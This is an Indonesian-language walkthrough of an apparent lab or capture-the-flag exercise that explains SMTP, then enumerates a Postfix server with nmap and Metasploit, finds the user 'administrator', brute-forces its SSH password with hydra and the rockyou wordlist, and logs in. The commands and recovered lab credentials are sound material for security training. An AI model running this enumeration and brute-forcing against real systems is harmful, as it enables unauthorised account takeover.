# Understanding SMTP

SMTP atau Simple Mail Transfer Protocol, yang mana merupakan yang digunakan untuk menangani pengiriman email. Untuk mendukung layanan email, diperlukan pasangan protokol yang terdiri dari SMTP dan POP/IMAP. Bersama-sama mereka memungkinkan user untuk mengirim email keluar dan mengambil email masuk.

SMTP melakukan 3 fungsi basic:

1. memverifikasi siapa yang mengirim email lewat SMTP server
2. mengirimkan email keluar
3. jika email tidak dapat dikirimkan keluar maka akan dikirimkan kembali ke pengirim

kebanyakan orang akan bertemu dengan SMTP ketika akan konfiguraasi email baru di third-party email client seperti thunderbird, karena untuk konfigurasi email baru diperlukan konfigurasi server SMTP agar bisa mengirimkan email ke luar.

# Enumerating SMTP

lakukan enumerasi menggunakan nmap

```shell
sudo nmap -A -oN enumer
```

hasil di file enumer

```shell
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 62:a7:03:13:39:08:5a:07:80:1a:e5:27:ee:9b:22:5d (RSA)
|   256 89:d0:40:92:15:09:39:70:17:6e:c5:de:5b:59:ee:cb (ECDSA)
|_  256 56:7c:d0:c4:95:2b:77:dd:53:d6:e6:73:99:24:f6:86 (ED25519)
25/tcp open  smtp    Postfix smtpd
| ssl-cert: Subject: commonName=polosmtp
| Subject Alternative Name: DNS:polosmtp
| Not valid before: 2020-04-22T18:38:06
|_Not valid after:  2030-04-20T18:38:06
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: polosmtp.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
...
```

terdapat 2 port terbuka yaitu SSH dan SMTP. setelah melakukan enumerasi port, karena target pertama adalah SMTP, maka kita dapat melakukan enumerasi server SMTP secara detail menggunakan metasploit. cari modul 'smtp_version', dan gunakan modul tersebut di msfconsole dengan cara

```shell
search smtp_version
-> (auxiliary/scanner/smtp/smtp_version)

use auxiliary/scanner/smtp/smtp_version
```

selanjutnya kita konfigurasi yang diperlukan dengan gunakan command `show options`. untuk enumerasi server SMTP ini kita hanya perlu mengganti RHOSTS dengan cara `set RHOSTS <IP target>` nantinya akan menghasilkan output

```shell
[+] 10.10.97.137:25       - 10.10.97.137:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.97.137:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Nama dari system mail adalah `polosmtp.home`, dan Mail Transfer Agent (MTA) yang berjalan di service SMTP server ini adalah `Postfix`.

selanjutnya kita akan melakukan enumerasi username yang ada di server tersebut menggunakan metasploit lagi. lakukan `search smtp_enum`, lalu pilih `auxiliary/scanner/smtp/smtp_enum`. Setelah itu atur konfigurasi untuk serangan dengan mengatur RHOSTS ke IP target, dan USER_FILE atau wordlists untuk bruteforce username dengan `/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt` setelah itu jalankan exploit. hasilnya seperti berikut

```shell
[*] 10.10.97.137:25       - 10.10.97.137:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
[+] 10.10.97.137:25       - 10.10.97.137:25 Users found: administrator
[*] 10.10.97.137:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

kita dapatkan username '**administrator**'.

# Exploiting SMTP

dari enumerasi port, kita tahu bahwa ada port ssh yang terbuka selain SMTP, maka kita dapat coba untuk bruteforce ssh dengan informasi yang telah kita dapatkan. Jangan lupa untuk close `msfconsole` sebelum lanjut menggunakan `hydra`. Jika sudah kita akan bruteforce menggunakan `hydra` pada ssh dengan cara

```shell
hydra -t 8 -l administrator -P /usr/share/wordlists/rockyou.txt -vV <IP target> ssh
```

- `-t 8` : jumlah task yang dijalankan dalam proses
- `-l administrator` : storing username
- `-P /usr/share/wordlists/rockyou.txt` : path to password wordslist
- `-vV` : verbosity (optional)
- `ssh` : service to bruteforce

hasilnya adalah seperti berikut

```shell
...
[22][ssh] host: 10.10.97.137   login: administrator   password: alejandro
[STATUS] attack finished for 10.10.97.137 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
...
```

setelah kita dapat password, maka kita bisa masuk ke ssh dengan cara

```shell
ssh administrator@<IP target> -p 22

input password: alejandro
```

setelah masuk ke ssh, kita dapat mencari flagnya seperti biasa.